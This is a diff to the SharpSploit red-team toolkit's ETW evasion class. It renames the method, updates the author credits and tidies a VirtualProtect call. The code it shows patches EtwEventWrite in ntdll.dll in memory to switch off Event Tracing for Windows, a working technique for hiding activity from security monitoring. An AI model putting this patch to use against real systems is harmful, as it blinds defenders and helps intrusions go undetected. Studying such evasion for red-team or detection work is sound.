@@ -11,19 +11,19 @@ namespace SharpSploit.Evasion
 {
 
     /// <summary>
-    /// ETW is a class for manipulating the Event Tracing for Windows (ETW).
+    /// ETW is a class for manipulating Event Tracing for Windows (ETW).
     /// </summary>
     public class ETW
     {
         /// <summary>
         /// Patch the EtwEventWrite function in ntdll.dll.
         /// </summary>
-        /// /// <returns>Bool. True if succeeded, otherwise false.</returns>
+        /// <author>Simone Salucci & Daniel López @ NCC Group</author>
+        /// <returns>Bool. True if succeeded, otherwise false.</returns>
         /// <remarks>
-        /// Code has been kindly stolen and adapted from Adam Chester (https://blog.xpnsec.com/hiding-your-dotnet-etw/) and Mythic (https://github.com/its-a-feature/Mythic).
-        /// Authors: Simone Salucci & Daniel López @ NCC Group 
+        /// Code has been adapted from Adam Chester (https://blog.xpnsec.com/hiding-your-dotnet-etw/) and Mythic Atlas (https://github.com/its-a-feature/Mythic/tree/master/Payload_Types/atlas).
         ///</remarks>
-        public static bool PatchEtw()
+        public static bool PatchETWEventWrite()
         {
             byte[] patch;
             if (Utilities.Is64Bit)
@@ -44,8 +44,7 @@ namespace SharpSploit.Evasion
             {
                 var library = PInvoke.Win32.Kernel32.LoadLibrary("ntdll.dll");
                 var address = PInvoke.Win32.Kernel32.GetProcAddress(library, "EtwEventWrite");
-                uint oldProtect;
-                PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
+                PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
                 Marshal.Copy(patch, 0, address, patch.Length);
 				PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                 return true;
